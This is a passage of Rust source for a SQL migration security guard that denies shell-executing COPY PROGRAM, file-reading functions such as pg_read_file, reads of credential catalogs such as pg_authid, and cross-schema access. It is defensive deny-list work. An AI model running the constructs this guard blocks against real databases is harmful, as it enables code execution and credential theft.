//! The SQL security guard — parse-time deny-list + cross-schema confinement
//! (design §1.4 / §1.5). **The security heart of the engine.**
//!
//! Migrations are privileged arbitrary-SQL authored by untrusted creators AND a
//! prompt-injectable AI. This guard is the *first* line of defense-in-depth: it
//! parses every statement with the real Postgres parser and rejects the
//! dangerous set (RCE / privilege-escalation / cross-tenant / file / SSRF)
//! *regardless of the submitted SQL*. The least-privilege `migrator` role
//! (built later) is the second line — the DB rejects the same ops even if SQL
//! slips past parse.
//!
//! Two postures, by threat class:
//! - **Deny** (hard error): RCE, privilege escalation, cross-tenant access,
//!   filesystem/network reach. These can never be auto-confirmed.
//! - **Flag** (`GuardReport.destructive`): data loss (`DROP`/`TRUNCATE`/lossy
//!   type change). The guard does not deny these — the gate (built later)
//!   decides on data loss. The guard only surfaces them.
//!
//! **Deny-by-default:** an unrecognized statement that *could* be dangerous is
//! denied, not waved through.

pub mod denylist;

use std::collections::BTreeMap;

use pg_query::protobuf::node::Node as NodeEnum;
use pg_query::protobuf::{self, ObjectType};

use pg_query::protobuf::AlterTableType;

use crate::analysis::analyze::Advisory;
use crate::analysis::classify::{
    classify, DataSecurityClass, DdlKind, ParseError, StatementClass,
};
use crate::model::capability::{OperatorCapability, VendorCapabilities};
use crate::model::ir::{MigrationIr, Op};
use crate::model::migration::MigrationFlags;
use crate::model::policy::{SchemaScope, TrustProfile};
use crate::model::profile::DestructiveOps;
use zeroship_schema::query::SqlDialect;
use denylist::rule;
use serde_json::Value;

/// Stable data-security policy rule ids. These are policy decisions layered on
/// the guard, not deny-list parser rules.
pub mod data_security_rule {
    /// `data_security.destructive_ops = "forbid"` denied a destructive operation.
    pub const DESTRUCTIVE_OPS_FORBID: &str = "DATA_SECURITY_DESTRUCTIVE_OPS_FORBID";
    /// `data_security.destructive_ops = "forbid"` denied an unclassified operation.
    pub const UNCLASSIFIED_OP_DENIED_UNDER_FORBID: &str =
        "DATA_SECURITY_UNCLASSIFIED_OP_DENIED_UNDER_FORBID";
    /// `data_security.require_rls = true` denied a create-table without RLS enable.
    pub const REQUIRE_RLS: &str = "DATA_SECURITY_REQUIRE_RLS";
}

/// The in-crate enforcement primitive for the OPERATOR-gated profiles —
/// `Platform` (the zeroship internal posture) AND `Trusted` (the public
/// dbmate-like posture) — (design §4.1, HIGH-1). A zero-sized capability token
/// owned by [`crate::model::capability`].
///
/// [`GuardConfig::platform`] / [`GuardConfig::trusted`] and
/// [`crate::conn::ExecutorConfig::platform`] /
/// [`crate::conn::ExecutorConfig::trusted`] take a `&OperatorCapability`, so the
/// ability to produce `Platform`/`Trusted` is gated on holding a token minted by
/// an operator-side named seam. The token is generic across the two operator
/// profiles because both share the identical security model: the operator
/// running the binary holds it; no creator path can.
///
/// Per-guard configuration (design §4.1).
///
/// All fields are **private**: a `GuardConfig` is obtained ONLY through
/// [`GuardConfig::confined`] (the safe default anyone may construct),
/// [`GuardConfig::platform`], or [`GuardConfig::trusted`] (both require an
/// [`OperatorCapability`] token). This is what makes the §5 trust invariant
/// true at the public boundary — an external crate cannot write a
/// `GuardConfig { trust: Platform, .. }` / `{ trust: Trusted, .. }` literal, and
/// in-crate operator code produces `Platform`/`Trusted` through named token-mint
/// seams.
#[derive(Debug, Clone)]
pub struct GuardConfig {
    /// PRIVATE. The trust posture. Settable only through `confined()`/`platform()`.
    trust: TrustProfile,
    /// PRIVATE. The config-loaded capability composition the guard consults for
    /// every widened statement class. `trust` is retained as the public posture
    /// marker and constructor boundary; guard decisions below read these bits.
    capabilities: VendorCapabilities,
    /// PRIVATE. The operator-trusted belt-skip bit. This is intentionally NOT
    /// derivable from [`VendorCapabilities::operator`]: Platform and Trusted both
    /// grant the vendor op set, but only Trusted may skip the deny-list belt.
    skip_denylist_belt: bool,
    /// PRIVATE. The schemas this guard permits references to. Confined ⇒
    /// `Single(project_schema)`; Platform ⇒ `Allowlist([...])`.
    schemas: SchemaScope,
    /// PRIVATE. `CREATE EXTENSION` allowlist (the [`denylist`]'s
    /// `FORBIDDEN_EXTENSIONS` still override it in BOTH profiles). Private so
    /// the only way to obtain a non-empty allowlist is `platform()` or the
    /// Confined builder [`GuardConfig::with_extension_allowlist`].
    extension_allowlist: Vec<String>,
    /// PRIVATE. Data-security obligation: new tables must have a matching
    /// `ENABLE ROW LEVEL SECURITY` in the same IR migration.
    require_rls: bool,
    /// PRIVATE. Destructive DDL/DML posture for structured destructive op classes.
    destructive_ops: DestructiveOps,
    /// PRIVATE (PHASE 4). The target SQL dialect this guard config is for.
    ///
    /// - `Postgres` (the default) — the libpg_query line-1 guard runs
    ///   ([`SqlGuard::check`] parses + deny-walks the SQL). Every pre-PHASE-4
    ///   call site keeps this dialect, byte-identical.
    /// - `Sqlite` — the **descriptor-diff-only** Confined path (design §2.5.3):
    ///   `libpg_query` cannot parse SQLite, so there is NO line-1 parse guard;
    ///   the line-2 defense is the `SqliteBackend`'s runtime authorizer. The
    ///   Confined SQLite path accepts ONLY descriptor-diff-generated DDL — an
    ///   untrusted RAW SQL string presented to [`SqlGuard::check`] is REFUSED
    ///   fail-closed (it must come from the descriptor emitter). `Platform` is a
    ///   PG-only posture → it fail-closes to `Confined` on SQLite
    ///   ([`GuardConfig::for_dialect`]).
    dialect: SqlDialect,
}

impl GuardConfig {
    /// The ONLY constructor reachable from the submission ingress and every
    /// creator-path author. Always `Confined`, single-schema, empty extensions.
    /// Needs NO token — Confined is the safe default anyone may construct.
    #[must_use]
    pub fn confined(project_schema: impl Into<String>) -> Self {
        Self {
            trust: TrustProfile::Confined,
            capabilities: VendorCapabilities::confined(),
            skip_denylist_belt: false,
            schemas: SchemaScope::Single(project_schema.into()),
            extension_allowlist: Vec::new(),
            require_rls: false,
            destructive_ops: DestructiveOps::Allow,
            // Default to the PG line-1 guard — byte-identical to before PHASE 4.
            dialect: SqlDialect::Postgres,
        }
    }

    /// PHASE 4 — the Confined **SQLite** config (design §2.5.3). Like
    /// [`GuardConfig::confined`] but for the SQLite dialect: there is NO
    /// libpg_query line-1 guard (it cannot parse SQLite); the line-2 defense is
    /// the `SqliteBackend`'s runtime authorizer, and authoring is
    /// descriptor-diff-only. [`SqlGuard::check`] on this config REFUSES an
    /// untrusted raw SQL string (fail-closed): the only legitimate SQLite DDL
    /// comes from the descriptor emitter, never a hand-written string. Needs no
    /// token — Confined is the safe default anyone may construct.
    #[must_use]
    pub fn confined_sqlite(project_schema: impl Into<String>) -> Self {
        Self {
            trust: TrustProfile::Confined,
            capabilities: VendorCapabilities::confined(),
            skip_denylist_belt: false,
            schemas: SchemaScope::Single(project_schema.into()),
            extension_allowlist: Vec::new(),
            require_rls: false,
            destructive_ops: DestructiveOps::Allow,
            dialect: SqlDialect::Sqlite,
        }
    }

    /// Confined **MySQL** config. MySQL live apply accepts descriptor-generated
    /// DDL through the MySQL backend; raw SQL still has no MySQL parser/deny-walk
    /// and is refused by [`SqlGuard::check`] instead of being mis-vetted by
    /// libpg_query.
    #[must_use]
    pub fn confined_mysql(project_schema: impl Into<String>) -> Self {
        Self {
            trust: TrustProfile::Confined,
            capabilities: VendorCapabilities::confined(),
            skip_denylist_belt: false,
            schemas: SchemaScope::Single(project_schema.into()),
            extension_allowlist: Vec::new(),
            require_rls: false,
            destructive_ops: DestructiveOps::Allow,
            dialect: SqlDialect::Mysql,
        }
    }

    /// PHASE 4 — fail-closed dialect selection. Returns the guard config
    /// appropriate for `dialect`, mapping the requested profile down where SQLite
    /// has no equivalent:
    ///
    /// - `Postgres` → `self` unchanged (every profile is valid on PG).
    /// - `Sqlite` → **always Confined SQLite**. `Platform` is a PG-only posture
    ///   (the widened multi-schema allowlist has no SQLite analog — `main` IS the
    ///   one app file), so a Platform config fail-closes to Confined SQLite; a
    ///   Confined or Trusted config likewise becomes Confined SQLite (Trusted's
    ///   relaxed authorizer is a separate `SqliteBackend` concern, not a guard
    ///   one). This is the design's "Platform → fail-closed Confined on SQLite".
    #[must_use]
    pub fn for_dialect(self, dialect: SqlDialect) -> Self {
        match dialect {
            SqlDialect::Postgres => self,
            SqlDialect::Sqlite => {
                // Preserve the project schema (the single confined schema) where we
                // have one; otherwise empty. Platform's allowlist is dropped — it
                // has no SQLite meaning. Fail closed to Confined SQLite.
                let project_schema = match &self.schemas {
                    SchemaScope::Single(s) => s.clone(),
                    SchemaScope::Allowlist(list) => list.first().cloned().unwrap_or_default(),
                    SchemaScope::Unconfined => String::new(),
                };
                Self::confined_sqlite(project_schema)
            }
            SqlDialect::Mysql => {
                // MySQL uses the descriptor-generated DDL guard. Drop any
                // privileged PG posture and keep only the first confined schema.
                let project_schema = match &self.schemas {
                    SchemaScope::Single(s) => s.clone(),
                    SchemaScope::Allowlist(list) => list.first().cloned().unwrap_or_default(),
                    SchemaScope::Unconfined => String::new(),
                };
                Self::confined_mysql(project_schema)
            }
        }
    }

    /// Confined-path builder: set the `CREATE EXTENSION` allowlist. The creator
    /// path legitimately carries a per-project extension allowlist (e.g. the
    /// declarative author at `author.rs`), and a non-empty allowlist is NOT a
    /// privilege escalation — `FORBIDDEN_EXTENSIONS` still override it and the
    /// trust posture stays `Confined`. Platform configs set their allowlist via
    /// [`GuardConfig::platform`] instead.
    #[must_use]
    pub fn with_extension_allowlist(mut self, extensions: Vec<String>) -> Self {
        self.extension_allowlist = extensions;
        self
    }

    /// Tighten the guard with data-security policy knobs from a sealed profile.
    ///
    /// This builder is safe to expose because it can only add validation/denial
    /// obligations to whatever trust posture the caller can already construct.
    #[must_use]
    pub fn with_data_security(
        mut self,
        require_rls: bool,
        destructive_ops: DestructiveOps,
    ) -> Self {
        self.require_rls = require_rls;
        self.destructive_ops = match destructive_ops {
            // Approval is server-only. If a direct caller hands it to the guard,
            // fail closed by enforcing the stricter projection.
            DestructiveOps::RequireApproval => DestructiveOps::Forbid,
            other => other,
        };
        self
    }

    /// Platform profile. REQUIRES a [`OperatorCapability`] token, minted by
    /// operator-side named seams. The `_cap` arg is the in-crate enforcement;
    /// `#[non_exhaustive]` on [`TrustProfile`] is the external enforcement. This
    /// is the single place `TrustProfile::Platform` is named.
    #[must_use]
    pub(crate) fn platform(
        _cap: &OperatorCapability,
        schemas: Vec<String>,
        extension_allowlist: Vec<String>,
    ) -> Self {
        let mut capabilities = VendorCapabilities::operator();
        capabilities.schemas = schemas.clone();
        Self {
            trust: TrustProfile::Platform,
            capabilities,
            skip_denylist_belt: false,
            schemas: SchemaScope::Allowlist(schemas),
            extension_allowlist,
            require_rls: false,
            destructive_ops: DestructiveOps::Allow,
            // Platform is a PG-only posture (it fail-closes to Confined on SQLite
            // via `for_dialect`); the config itself is always PG.
            dialect: SqlDialect::Postgres,
        }
    }

    /// Trusted profile — the public dbmate-like posture (Track A). REQUIRES an
    /// [`OperatorCapability`] token, EXACTLY like [`GuardConfig::platform`], so
    /// neither an external crate nor an in-crate creator-path module
    /// (`submit`/`engine`) can produce a Trusted guard. The deny-list, the
    /// cross-schema confinement, and the body walks are all SKIPPED by
    /// [`SqlGuard::check`] under `Trusted` (arbitrary SQL applies as the
    /// connecting role); the destructive/transactional/approval flags are still
    /// derived. The `schemas`/`extension_allowlist` fields are unused under
    /// Trusted (no confinement, no extension allowlisting) — they are set to the
    /// inert empty shapes so the struct stays uniform. This is the single place
    /// `TrustProfile::Trusted` is named.
    #[must_use]
    #[cfg(any(test, feature = "standalone-cli"))]
    pub(crate) fn trusted(_cap: &OperatorCapability) -> Self {
        Self {
            trust: TrustProfile::Trusted,
            capabilities: VendorCapabilities::operator(),
            skip_denylist_belt: true,
            // Inert: the Trusted early-return never consults `schemas` (no
            // cross-schema walk) nor `extension_allowlist` (no statement-kind
            // gate). Kept empty so a future code path can never accidentally
            // read a stale allowlist.
            schemas: SchemaScope::Allowlist(Vec::new()),
            extension_allowlist: Vec::new(),
            require_rls: false,
            destructive_ops: DestructiveOps::Allow,
            dialect: SqlDialect::Postgres,
        }
    }

    /// PHASE 4 — the target SQL dialect this guard config vets.
    #[must_use]
    pub(crate) fn dialect(&self) -> SqlDialect {
        self.dialect
    }

    /// The trust posture the guard internals consult.
    #[must_use]
    pub(crate) fn trust(&self) -> TrustProfile {
        self.trust
    }

    /// The config-loaded capability composition the guard uses for its widened
    /// statement classes.
    #[must_use]
    pub fn vendor_capabilities(&self) -> &VendorCapabilities {
        &self.capabilities
    }

    #[must_use]
    pub(crate) const fn skips_denylist_belt(&self) -> bool {
        self.skip_denylist_belt
    }

    /// **PR10** — the schema-confinement scope this guard config enforces, for the
    /// validate-time cross-schema gate (§2.7). Returns:
    /// - `Some(SchemaScope)` for **Confined** (the `Single(project_schema)` pin) and
    ///   **Platform** (the configured `Allowlist`) — an op's explicit `schema` must
    ///   be permitted by it.
    /// - `Some(SchemaScope::Unconfined)` for **Trusted** (the public dbmate-like
    ///   posture) — NO cross-schema confinement, but still an explicit operator
    ///   signal to the validate/load APIs.
    ///
    /// This is the SINGLE source of truth that maps the guard's trust posture to the
    /// validator's confinement scope, so the parse-guard cross-schema denial (line 1)
    /// and the friendlier validate-time refusal (PR10) agree on the permitted set.
    #[must_use]
    pub fn schema_scope(&self) -> Option<SchemaScope> {
        match self.trust {
            TrustProfile::Trusted => Some(SchemaScope::Unconfined),
            // Confined ⇒ Single(project_schema); Platform ⇒ Allowlist — both carried
            // verbatim in `self.schemas`.
            TrustProfile::Confined | TrustProfile::Platform => Some(self.schemas.clone()),
        }
    }

    /// Data-security RLS requirement carried into the guard.
    #[must_use]
    pub const fn require_rls(&self) -> bool {
        self.require_rls
    }

    /// Data-security destructive-op posture carried into the guard.
    #[must_use]
    pub const fn destructive_ops(&self) -> DestructiveOps {
        self.destructive_ops
    }
}

impl Default for GuardConfig {
    /// Confined, empty single-schema, empty extensions, PG dialect — today's
    /// behaviour.
    fn default() -> Self {
        Self::confined(String::new())
    }
}

/// T8 — the EXTERNAL trust boundary, pinned as `compile_fail` doctests (design
/// §5 / §12 T8). A doctest is compiled as a SEPARATE crate that `use`s
/// `zeroship_migrate`, so it exercises exactly the external boundary the control
/// plane / builder sit behind. Each snippet below MUST fail to compile.
///
/// (1) An external crate cannot write a `GuardConfig { .. }` struct literal —
/// the fields are private (shown for both privileged profiles):
///
/// ```compile_fail
/// use zeroship_migrate::{GuardConfig, SchemaScope, TrustProfile};
/// let _ = GuardConfig {
///     trust: TrustProfile::Platform,
///     schemas: SchemaScope::Allowlist(vec!["zeroship".into()]),
///     extension_allowlist: vec![],
/// };
/// ```
///
/// ```compile_fail
/// use zeroship_migrate::{GuardConfig, SchemaScope, TrustProfile};
/// let _ = GuardConfig {
///     trust: TrustProfile::Trusted,
///     schemas: SchemaScope::Allowlist(vec![]),
///     extension_allowlist: vec![],
/// };
/// ```
///
/// (2) `TrustProfile` is `#[non_exhaustive]`, so an external crate cannot
/// exhaustively match it (it must add a wildcard) — it can never assume it has
/// seen every variant, and cannot construct a future fielded variant. (NOTE:
/// `#[non_exhaustive]` does NOT make naming an existing fieldless variant like
/// `Platform` / `Trusted` a compile error — naming it is harmless because the
/// external boundary is enforced by the PRIVATE `GuardConfig` fields + the
/// `pub(crate)` `platform()`/`trusted()` ctors + the `pub(crate)` token,
/// snippets (1) and (3), not by un-nameability of the variant.)
///
/// ```compile_fail
/// use zeroship_migrate::TrustProfile;
/// fn _exhaustive(t: TrustProfile) -> u8 {
///     match t {
///         TrustProfile::Confined => 0,
///         TrustProfile::Platform => 1,
///         TrustProfile::Trusted => 2,
///         // no wildcard arm — rejected because the enum is #[non_exhaustive].
///     }
/// }
/// ```
///
/// (3) …nor even NAME the `OperatorCapability` token type (it is `pub(crate)`,
/// so it does not exist in the external crate's view of the module) — so neither
/// `GuardConfig::platform` nor `GuardConfig::trusted` can be called externally
/// (they require a `&OperatorCapability` that cannot be named):
///
/// ```compile_fail
/// use zeroship_migrate::model::capability::OperatorCapability;
/// fn _needs_a_token(_c: &OperatorCapability) {}
/// ```
///
/// For contrast, the safe Confined constructor IS reachable externally:
///
/// ```
/// use zeroship_migrate::guard::GuardConfig;
/// let _ = GuardConfig::confined("proj_acme");
/// ```
#[cfg(doctest)]
struct ExternalTrustBoundaryCompileFail;

/// A guard rejection.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum GuardError {
    /// A hard-denied dangerous construct (RCE / priv-esc / file / network).
    #[error("denied by rule '{rule}': {statement}")]
    Denied {
        /// The stable rule id (see [`denylist::rule`]).
        rule: &'static str,
        /// The offending statement text.
        statement: String,
    },
    /// A reference to a schema outside the project schema (cross-tenant).
    #[error("cross-schema access to '{schema}' denied: {statement}")]
    CrossSchema {
        /// The foreign schema that was referenced.
        schema: String,
        /// The offending statement text.
        statement: String,
    },
    /// A data-security profile knob denied the migration.
    #[error("data_security policy '{rule}' denied: {statement}")]
    DataSecurityPolicy {
        /// The stable data-security rule id.
        rule: &'static str,
        /// The offending statement or IR op.
        statement: String,
    },
    /// The SQL could not be parsed (deny-by-default: it never reaches the DB).
    #[error("parse error: {0}")]
    Parse(#[from] ParseError),
    /// PHASE 4 — a raw SQL string was presented to [`SqlGuard::check`] on the
    /// Confined **SQLite** path, which accepts ONLY descriptor-diff-generated DDL
    /// (design §2.5.3). `libpg_query` cannot vet SQLite, so there is no line-1
    /// parse guard for raw SQLite SQL; the only safe SQLite DDL comes from the
    /// engine's descriptor emitter (validated at the author boundary, line-2
    /// enforced by the `SqliteBackend` authorizer). A hand-written / untrusted
    /// SQLite SQL string is therefore refused fail-closed.
    #[error(
        "raw SQL is not accepted on the Confined SQLite path: SQLite migrations \
         must be descriptor-diff-generated (libpg_query cannot vet SQLite; the \
         SqliteBackend authorizer is the line-2 defense)"
    )]
    SqliteRawSqlRejected,
    /// A raw SQL string was presented to the Postgres guard on the MySQL path.
    /// MySQL has no parser/deny-walk in this crate, so raw SQL is refused
    /// fail-closed instead of being mis-vetted by libpg_query.
    #[error(
        "raw SQL is not accepted on the MySQL path: MySQL migrations must be \
         descriptor-generated because no MySQL parser/deny-walk is available"
    )]
    MysqlRawSqlRejected,
}

/// The result of a passing [`SqlGuard::check`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GuardReport {
    /// The classification of every statement (in order).
    pub classes: Vec<StatementClass>,
    /// True if *any* statement is destructive (data loss). The gate decides.
    pub destructive: bool,
    /// Operational [`Advisory`](crate::analyze::Advisory)s — lock-heavy ops,
    /// destructive/backward-incompatible shapes, missing FK indexes, etc.
    /// **Advisory-only:** these never deny or gate (the deny-list +
    /// least-privilege role own security; the engine gate owns data-loss
    /// approval). They enrich the report so the AI/creator sees the operational
    /// footgun and the safer alternative. See [`crate::analysis::analyze`].
    pub advisories: Vec<Advisory>,
}

/// The SQL security guard.
#[derive(Debug, Clone)]
pub struct SqlGuard {
    cfg: GuardConfig,
}

impl SqlGuard {
    /// Construct a guard for a project.
    #[must_use]
    pub const fn new(cfg: GuardConfig) -> Self {
        Self { cfg }
    }

    /// Check a migration's SQL. Returns a [`GuardReport`] if every statement is
    /// safe (destructive ops flagged, not denied), or a [`GuardError`] on the
    /// first dangerous/cross-tenant/unparseable construct.
    ///
    /// # Errors
    /// - [`GuardError::Denied`] — a hard-denied construct (incl. ones nested
    ///   inside `DO $$…$$` blocks and function bodies).
    /// - [`GuardError::CrossSchema`] — a reference outside the project schema.
    /// - [`GuardError::Parse`] — unparseable SQL (deny-by-default).
    ///
    /// Under [`TrustProfile::Trusted`] the deny-list / cross-schema / body walks
    /// are SKIPPED entirely (the operator owns the DB; arbitrary SQL applies) —
    /// only `classify` + `analyze` run so the destructive/transactional/approval
    /// flags are still derived. A [`GuardError::Parse`] can still surface
    /// (malformed SQL has no parse tree to classify), but no `Denied`/`CrossSchema`
    /// can: there is no deny arm on the Trusted path.
    pub fn check(&self, sql: &str) -> Result<GuardReport, GuardError> {
        // SQLite fail-closed backstop. `SqlGuard` is the **Postgres** line-1
        // (libpg_query below); it is the PG arm of the per-engine
        // [`MigrationGuard`] seam ([`PgGuard`] wraps it). The engine never selects
        // `SqlGuard` for SQLite — it routes through [`SqliteDescriptorGuard`] (via
        // [`guard_for`]), the trusted descriptor-diff path.
        // This arm is the defensive fail-closed for the *wrong caller*: if a raw,
        // untrusted SQLite string is ever handed to the PG guard (a SQLite-keyed
        // `GuardConfig`), `libpg_query` cannot vet it, so we reject rather than
        // mis-parse. (Trusted SQLite, if it ever exists, is a separate
        // operator-gated concern; today no SQLite config is Trusted.)
        match self.cfg.dialect() {
            SqlDialect::Postgres => {}
            SqlDialect::Sqlite => return Err(GuardError::SqliteRawSqlRejected),
            SqlDialect::Mysql => return Err(GuardError::MysqlRawSqlRejected),
        }

        let classes = classify(sql)?;

        // Walk the full parse tree once per statement. The data-security policy
        // check runs even under Trusted; the deny-list/cross-schema/body walk below
        // is what Trusted skips.
        let parsed = pg_query::parse(sql).map_err(|e| ParseError::Syntax(e.to_string()))?;
        let mut data_security_advisories = Vec::new();
        let mut class_index = 0;
        for raw_stmt in &parsed.protobuf.stmts {
            let Some(node) = raw_stmt.stmt.as_ref().and_then(|s| s.node.as_ref()) else {
                continue;
            };
            let class = classes.get(class_index).ok_or_else(|| {
                GuardError::Parse(ParseError::Syntax(
                    "internal classifier/parse statement count mismatch".to_string(),
                ))
            })?;
            class_index += 1;
            let raw = stmt_text(sql, raw_stmt);
            self.check_sql_data_security_policy(class, &raw, &mut data_security_advisories)?;

            if self.cfg.skips_denylist_belt() {
                continue;
            }

            // Serialize the ONE statement subtree to JSON for the generic
            // full-tree walks (dangerous funcs + every schema reference). This
            // sidesteps `node.nodes()`, whose hand-written traversal skips
            // column DEFAULT / CHECK / VALUES / RULE-action subtrees.
            let json = guard_stmt_json(raw_stmt, &raw)?;
            self.check_node(node, &json, &raw)?;
        }

        // TRUSTED early-return — the public dbmate-like posture (Track A). The
        // operator owns the database, so there is NO untrusted boundary: skip the
        // deny-list, cross-schema confinement, and body walks ENTIRELY and apply
        // arbitrary SQL. We still derive the report from `classify` (above) +
        // `analyze` (below) so `flags_for` keeps gating destructive ops via the
        // CLI's `--yes`. Data-security policy above remains load-bearing when a
        // direct caller explicitly tightens a Trusted config with those knobs.
        if self.cfg.skips_denylist_belt() {
            let mut advisories = crate::analysis::analyze::analyze(sql);
            advisories.extend(data_security_advisories);
            let destructive = classes.iter().any(|c| c.destructive);
            return Ok(GuardReport {
                classes,
                destructive,
                advisories,
            });
        }

        // Collect operational advisories (lock-heavy / destructive / rename /
        // missing-FK-index shapes). These are ADVISORY ONLY — see
        // `crate::analysis::analyze`; they never deny or gate. We reuse the single parse
        // already done above by re-running the analyzer engine over the SQL.
        let mut advisories = crate::analysis::analyze::analyze(sql);
        advisories.extend(data_security_advisories);

        let destructive = classes.iter().any(|c| c.destructive);
        Ok(GuardReport {
            classes,
            destructive,
            advisories,
        })
    }

    /// Backstop for the two IR raw islands (`pg.sql` and `createFunction.body`)
    /// under the Trusted operator profile. Trusted still skips project-schema
    /// confinement for general SQL files, but arbitrary SQL strings embedded inside
    /// otherwise structured IR must not bypass the deny-list for host-reaching or
    /// privilege-escalating constructs.
    ///
    /// # Errors
    /// [`GuardError`] when parsing fails or a deny-listed construct is found.
    pub(crate) fn check_raw_island_sql_backstop(&self, sql: &str) -> Result<(), GuardError> {
        match self.cfg.dialect() {
            SqlDialect::Postgres => {}
            SqlDialect::Sqlite => return Err(GuardError::SqliteRawSqlRejected),
            SqlDialect::Mysql => return Err(GuardError::MysqlRawSqlRejected),
        }

        let parsed = pg_query::parse(sql).map_err(|e| ParseError::Syntax(e.to_string()))?;
        for raw_stmt in &parsed.protobuf.stmts {
            let Some(node) = raw_stmt.stmt.as_ref().and_then(|s| s.node.as_ref()) else {
                continue;
            };
            let raw = stmt_text(sql, raw_stmt);
            let json = guard_stmt_json(raw_stmt, &raw)?;
            self.check_node_raw_island_backstop(node, &json, &raw)?;
        }
        Ok(())
    }

    /// Backstop for a raw function body under Trusted. PL/pgSQL is only
    /// best-effort parseable as SQL, so this intentionally reuses the existing body
    /// scanner: parse what can be parsed, inspect dynamic SQL literals, then token
    /// scan for deny-listed names.
    pub(crate) fn check_raw_island_body_backstop(
        &self,
        body: &str,
        raw: &str,
    ) -> Result<(), GuardError> {
        self.check_body_text(body, raw)
    }

    /// Check one top-level statement node (and everything nested under it).
    ///
    /// `json` is the `serde_json` serialization of the statement's `RawStmt`
    /// subtree — used by the generic full-tree walks (Root Cause 2 fix) so we
    /// visit EVERY node, including the slots `pg_query::nodes()` skips (column
    /// DEFAULT, CHECK, VALUES lists, RULE actions, SET SCHEMA targets, …).
    fn check_node(&self, node: &NodeEnum, json: &Value, raw: &str) -> Result<(), GuardError> {
        // 1. Statement-kind gate: DENY-BY-DEFAULT. Only an enumerated set of
        //    known-safe migration statements passes; everything else is denied.
        self.check_statement_kind(node, raw)?;

        // 2. Cross-schema confinement — any explicit foreign schema, anywhere
        //    in the full tree (RangeVar, SET SCHEMA newschema, CreateSchema,
        //    trigger/CALL funcname, COMMENT object, INHERIT target, …).
        self.check_cross_schema(json, raw)?;

        // 2b. System-catalog relation reads/writes — `pg_catalog.pg_authid`,
        //     unqualified `pg_shadow`/`pg_user`, `information_schema.*`. These
        //     leak roles/passwords/source and are never a project's own table.
        Self::check_system_catalog_relations(json, raw)?;

        // 3. Dangerous function calls anywhere in the FULL expression tree
        //    (file/network functions in SELECT/DML/DEFAULT/CHECK/VALUES/etc.).
        Self::check_dangerous_functions(json, raw)?;

        // 3b. Belt: a `'pg_read_file'::regprocedure` / `::regproc` cast names a
        //     dangerous function as a TEXT literal the FuncCall walk never sees.
        Self::check_regproc_casts(json, raw)?;

        // 3c. Cross-schema via a STRING LITERAL argument: a schema-qualified
        //     object named inside a literal passed to a `reg*` cast or a
        //     name-resolving builtin (`nextval`/`setval`/`to_regclass`/…) is an
        //     `A_Const`, invisible to the structural schema walker. Re-check the
        //     literal's leading `schema.` qualifier for confinement.
        self.check_literal_schema_refs(json, raw)?;

        // 3d. `set_config('search_path'|'role'|…, …)` is the function form of a
        //     `SET <param>` the structural VariableSetStmt gate denies — deny
        //     the call form identically.
        Self::check_set_config_calls(json, raw)?;

        // 3e. `query_to_xml('SELECT … FROM control.users', …)` & family take a
        //     free-form SQL string the server executes; the embedded SQL is
        //     never re-parsed by the walks above, so a cross-schema read,
        //     file-access function, or DDL hidden in the literal slips past.
        //     Re-parse each such literal and run the SAME guard recursively
        //     (reusing `check_body_text`, the body re-parse machinery).
        //     A non-literal/runtime query arg is out of parse-scope — line-2
        //     (least-priv `migrator` role) defense, same limit as `set_config`.
        self.check_sql_string_arg_calls(json, raw)?;

        // 4. Recurse into DO blocks and function bodies — the must-inspect
        //    case. A dangerous construct hidden in a body is still dangerous.
        self.check_bodies(node, raw)?;

        Ok(())
    }

    fn check_sql_data_security_policy(
        &self,
        class: &StatementClass,
        raw: &str,
        advisories: &mut Vec<Advisory>,
    ) -> Result<(), GuardError> {
        match self.cfg.destructive_ops {
            DestructiveOps::Forbid | DestructiveOps::RequireApproval => match class.data_security {
                DataSecurityClass::NonDestructive => Ok(()),
                DataSecurityClass::Destructive(operation) => Err(GuardError::DataSecurityPolicy {
                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                    statement: format!("{operation}: {raw}"),
                }),
                DataSecurityClass::Unknown => Err(GuardError::DataSecurityPolicy {
                    rule: data_security_rule::UNCLASSIFIED_OP_DENIED_UNDER_FORBID,
                    statement: format!(
                        "unclassified operation denied under destructive_ops=forbid: {raw}"
                    ),
                }),
            },
            DestructiveOps::Warn => {
                match class.data_security {
                    DataSecurityClass::NonDestructive => {}
                    DataSecurityClass::Destructive(operation) => {
                        advisories.push(Advisory::destructive_ops_warn(operation, raw));
                    }
                    DataSecurityClass::Unknown => {
                        advisories.push(Advisory::destructive_ops_unknown_warn(raw));
                    }
                }
                Ok(())
            }
            DestructiveOps::Allow => Ok(()),
        }
    }

    /// Raw-island variant of [`Self::check_node`]. It preserves the deny-list and
    /// body scanning but skips project-schema confinement, matching Trusted's
    /// operator posture for SQL ownership while still blocking dangerous arbitrary
    /// raw text.
    fn check_node_raw_island_backstop(
        &self,
        node: &NodeEnum,
        json: &Value,
        raw: &str,
    ) -> Result<(), GuardError> {
        self.check_statement_kind(node, raw)?;
        Self::check_system_catalog_relations(json, raw)?;
        Self::check_dangerous_functions(json, raw)?;
        Self::check_regproc_casts(json, raw)?;
        Self::check_set_config_calls(json, raw)?;
        self.check_sql_string_arg_calls(json, raw)?;
        self.check_bodies(node, raw)?;
        Ok(())
    }

    /// Statement-kind gate, **deny-by-default** (Root Cause 1 fix).
    ///
    /// A curated allowlist of known-safe migration statement kinds passes;
    /// every other statement node is denied (`UNRECOGNIZED_DANGEROUS`). The
    /// recognized-dangerous kinds are matched first so they get a precise rule
    /// id (better diagnostics) — but the *default* arm is DENY, not allow.
    #[allow(clippy::too_many_lines)]
    fn check_statement_kind(&self, node: &NodeEnum, raw: &str) -> Result<(), GuardError> {
        match node {
            // ---- Recognized-dangerous: precise rule ids ----
            // COPY … PROGRAM = shell RCE; COPY … <file> = filesystem.
            // COPY … TO STDOUT / FROM STDIN (no program, no filename) is fine.
            NodeEnum::CopyStmt(c) => {
                if c.is_program {
                    return Err(denied(rule::COPY_PROGRAM, raw));
                }
                if !c.filename.is_empty() {
                    return Err(denied(rule::COPY_FILE, raw));
                }
                // Plain COPY … TO STDOUT / FROM STDIN — safe.
                return Ok(());
            }
            // ALTER SYSTEM — cluster-wide config, always denied (BOTH profiles).
            NodeEnum::AlterSystemStmt(_) => return Err(denied(rule::ALTER_SYSTEM, raw)),
            // Role management — privilege escalation. ALLOW iff Platform (§4.1):
            // the platform schema migrations must CREATE/ALTER/DROP roles and
            // pin their search_path (0025/0027). Confined still hard-denies.
            //
